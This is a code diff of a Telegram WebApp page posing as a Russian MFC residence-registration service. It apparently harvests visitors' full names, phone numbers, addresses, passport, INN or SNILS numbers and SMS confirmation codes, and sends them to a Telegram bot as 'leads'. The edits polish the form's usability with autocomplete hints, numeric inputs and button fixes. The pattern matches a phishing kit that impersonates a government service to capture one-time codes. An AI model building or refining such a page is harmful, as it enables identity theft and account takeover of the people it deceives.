@@ -10,20 +10,21 @@
     :root{--primary-color:#800000;--secondary-color:#660000;--info-color:#990000;--error-color:#B22222;--background-color:#F5E6E6;--white:#fff;--text-color:#333;--shadow:0 4px 12px rgba(128,0,0,.3);--input-bg:#EADADA;--input-border:#990000;--table-header-bg:linear-gradient(90deg,#800000,#660000)}
     *{box-sizing:border-box;margin:0;padding:0}
     body{font-family:'Segoe UI',Arial,sans-serif;background:var(--background-color);padding:20px;display:flex;justify-content:center;min-height:100vh}
-    .container{max-width:500px;width:100%;background:var(--white);padding:30px;border-radius:16px;box-shadow:var(--shadow);text-align:center}
+    .container{max-width:520px;width:100%;background:var(--white);padding:30px;border-radius:16px;box-shadow:var(--shadow);text-align:center}
     .step{display:none;text-align:left}.step.active{display:block}
     h2,h3{margin-bottom:20px;font-weight:700;font-size:1.6em;color:var(--primary-color);display:flex;align-items:center;gap:10px;line-height:1.3}
+    p{margin-bottom:14px}
     .input-group{margin-bottom:20px;text-align:left;display:flex;flex-direction:column}
     input{width:100%;padding:12px 15px;margin-top:8px;border:2px solid var(--input-border);border-radius:10px;font-size:16px;background:var(--input-bg);box-shadow:0 2px 6px rgba(0,0,0,.1);transition:border-color .3s,box-shadow .3s}
     input:focus{outline:none;border-color:var(--primary-color);box-shadow:0 4px 12px rgba(128,0,0,.2)}
-    .error{color:var(--error-color);font-size:14px;margin-top:6px;font-weight:600;text-align:left}
+    .error{color:var(--error-color);font-size:14px;margin-top:6px;font-weight:600;text-align:left;min-height:1.2em}
     .buttons{margin-top:20px;display:flex;flex-direction:column;gap:12px}
-    button{width:100%;padding:14px;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;transition:background-color .3s,transform .1s;text-align:center;color:var(--white)}
+    button{width:100%;padding:14px;border:none;border-radius:10px;cursor:pointer;font-size:16px;font-weight:600;transition:background-color .3s,transform .1s;text-align:center;color:var(--white);user-select:none}
     button:hover{transform:translateY(-2px)}button:disabled{background:#ccc;cursor:not-allowed}
     .next{background:var(--primary-color)}.back{background:var(--secondary-color)}.menu-btn{background:var(--info-color)}
     .data-table{margin-top:20px;width:100%;border-collapse:collapse;display:none;background:var(--white);border-radius:10px;overflow:hidden}
     .data-table.active{display:table}
-    .data-table th,.data-table td{border:1px solid var(--input-border);padding:15px;text-align:left;font-size:14px}
+    .data-table th,.data-table td{border:1px solid var(--input-border);padding:12px 14px;text-align:left;font-size:14px}
     .data-table th{background:var(--table-header-bg);color:var(--white);font-weight:700;text-transform:uppercase}
     .data-table tr{transition:background-color .3s}.data-table tr:hover{background-color:#F9F5F5}.data-table tr:nth-child(even){background-color:#F5EDED}
   </style>
@@ -36,12 +37,12 @@
         <h2 id="welcome-message">📋 Добро пожаловать, 👋</h2>
         <p>Готовы начать оформление регистрации по месту жительства?</p>
         <div class="buttons">
-          <button class="menu-btn" data-action="schedule">📋 Записаться на приём</button>
-          <button class="menu-btn" data-action="documents">📜 Список документов</button>
-          <button class="menu-btn" data-action="check-status">🔍 Проверить статус заявки</button>
-          <button class="menu-btn" data-action="contact">📞 Связаться с поддержкой</button>
-          <button class="menu-btn" data-action="faq">❓ Частые вопросы</button>
-          <button class="menu-btn" data-action="show-data">📊 Мои данные</button>
+          <button type="button" class="menu-btn" data-action="schedule">📋 Записаться на приём</button>
+          <button type="button" class="menu-btn" data-action="documents">📜 Список документов</button>
+          <button type="button" class="menu-btn" data-action="check-status">🔍 Проверить статус заявки</button>
+          <button type="button" class="menu-btn" data-action="contact">📞 Связаться с поддержкой</button>
+          <button type="button" class="menu-btn" data-action="faq">❓ Частые вопросы</button>
+          <button type="button" class="menu-btn" data-action="show-data">📊 Мои данные</button>
         </div>
       </div>
 
@@ -49,12 +50,12 @@
       <div class="step" id="step-fullname">
         <h3>👤 Укажите ФИО</h3>
         <div class="input-group">
-          <input type="text" id="fullname" placeholder="Иванов Иван Иванович">
+          <input type="text" id="fullname" placeholder="Иванов Иван Иванович" autocomplete="name">
           <div class="error" id="err-fullname"></div>
         </div>
         <div class="buttons">
-          <button class="back">↩️ Вернуться назад</button>
-          <button class="next">➡️ Далее</button>
+          <button type="button" class="back">↩️ Вернуться назад</button>
+          <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
 
@@ -62,12 +63,12 @@
       <div class="step" id="step-phone">
         <h3>📞 Номер телефона</h3>
         <div class="input-group">
-          <input type="tel" id="phone" placeholder="+79991234567">
+          <input type="tel" id="phone" placeholder="+79991234567" inputmode="tel" autocomplete="tel">
           <div class="error" id="err-phone"></div>
         </div>
         <div class="buttons">
-          <button class="back">↩️ Вернуться назад</button>
-          <button class="next">➡️ Далее</button>
+          <button type="button" class="back">↩️ Вернуться назад</button>
+          <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
 
@@ -75,12 +76,12 @@
       <div class="step" id="step-address">
         <h3>🏠 Укажите адрес</h3>
         <div class="input-group">
-          <input type="text" id="address" placeholder="г. Москва, ул. Ленина, д. 1, кв. 2">
+          <input type="text" id="address" placeholder="г. Москва, ул. Ленина, д. 1, кв. 2" autocomplete="address-line1">
           <div class="error" id="err-address"></div>
         </div>
         <div class="buttons">
-          <button class="back">↩️ Вернуться назад</button>
-          <button class="next">➡️ Далее</button>
+          <button type="button" class="back">↩️ Вернуться назад</button>
+          <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
 
@@ -88,11 +89,11 @@
       <div class="step" id="step-document-type">
         <h3>📄 Выберите документ</h3>
         <div class="buttons">
-          <button class="menu-btn" data-doc="Паспорт">📄 Паспорт</button>
-          <button class="menu-btn" data-doc="ИНН">🧾 ИНН</button>
-          <button class="menu-btn" data-doc="СНИЛС">🟢 СНИЛС</button>
+          <button type="button" class="menu-btn" data-doc="Паспорт">📄 Паспорт</button>
+          <button type="button" class="menu-btn" data-doc="ИНН">🧾 ИНН</button>
+          <button type="button" class="menu-btn" data-doc="СНИЛС">🟢 СНИЛС</button>
         </div>
-        <div class="buttons"><button class="back">↩️ Вернуться назад</button></div>
+        <div class="buttons"><button type="button" class="back">↩️ Вернуться назад</button></div>
       </div>
 
       <!-- Номер документа -->
@@ -104,8 +105,8 @@
           <div class="error" id="err-doc"></div>
         </div>
         <div class="buttons">
-          <button class="back">↩️ Вернуться назад</button>
-          <button class="next">➡️ Далее</button>
+          <button type="button" class="back">↩️ Вернуться назад</button>
+          <button type="button" class="next">➡️ Далее</button>
         </div>
       </div>
 
@@ -113,12 +114,12 @@
       <div class="step" id="step-code">
         <h3>🔐 Введите код из SMS</h3>
         <div class="input-group">
-          <input type="text" id="code" placeholder="1234">
+          <input type="text" id="code" placeholder="1234" inputmode="numeric" pattern="\d*">
           <div class="error" id="err-code"></div>
         </div>
         <div class="buttons">
-          <button class="back">↩️ Вернуться назад</button>
-          <button class="next">➡️ Подтвердить</button>
+          <button type="button" class="back">↩️ Вернуться назад</button>
+          <button type="button" class="next">➡️ Подтвердить</button>
         </div>
       </div>
 
@@ -136,11 +137,11 @@
   </div>
 
   <script>
-    /* ——— Безопасная отправка в бота, чтобы не было дублей ——— */
+    // ——— безопасная отправка в бота без дублей ———
     let __lastSent = "";
     function sendToBotOnce(rec){
       const tg = window.Telegram && window.Telegram.WebApp;
-      if (!tg) return; // Если не в WebApp — просто покажем превью
+      if (!tg) return; // если открыто НЕ из Telegram — просто покажем превью
       try{
         const json = JSON.stringify({ type: "lead", payload: rec });
         if (json === __lastSent) return;
@@ -166,13 +167,15 @@
         const root = document.getElementById("wizard");
         if(!root) return;
         root.addEventListener("click",(e)=>{
-          const t = e.target;
+          const t = e.target.closest("button");
+          if (!t) return;
           if (t.classList.contains("next")) this.next();
           else if (t.classList.contains("back")) this.back();
           else if (t.classList.contains("menu-btn")) this.menu(t.dataset.action, t.dataset.doc);
         });
         ["fullname","phone","address","docnumber","code"].forEach(id=>{
-          document.getElementById(id)?.addEventListener("input",()=>this.validate(this.currentStep));
+          const el = document.getElementById(id);
+          el && el.addEventListener("input",()=>this.validate(this.currentStep));
         });
       }
 
@@ -246,7 +249,6 @@
           document: `${this.formData["document-type"]||""} ${this.formData["document-number"]||""}`.trim(),
           code: this.formData.code || ""
         };
-        // Отправляем в бота и показываем локально
         sendToBotOnce(rec);
         this.dataStore.push(rec);
         this.renderTable();
@@ -265,6 +267,7 @@
       }
     }
 
+    // Инициализация
     new MFCWizard();
   </script>
 </body>
